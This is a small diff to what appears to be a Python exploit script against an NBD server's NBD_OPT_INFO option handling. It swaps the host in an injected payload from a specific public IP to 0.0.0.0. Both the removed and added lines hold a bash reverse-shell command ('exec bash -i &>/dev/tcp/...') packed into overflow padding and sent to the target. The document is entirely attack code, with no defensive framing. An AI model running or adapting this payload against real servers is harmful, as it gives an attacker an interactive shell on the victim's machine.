@@ -98,7 +98,7 @@ def NBD_OPT_INFO(buf):
     anum(len(buf)+4)
     sn(buf)
     p.read()
-    pad = b" "*0x10+b'''sleep 3;bash -c 'exec bash -i &>/dev/tcp/49.234.220.122/20191 <&1';'''*0x6
+    pad = b" "*0x10+b'''sleep 3;bash -c 'exec bash -i &>/dev/tcp/0.0.0.0/12345 <&1';'''*0x6
     sn(pad.ljust(len(buf)+4,b'\0'))
     sn(p16(0,endian='big'))
     p.readuntil("nown")
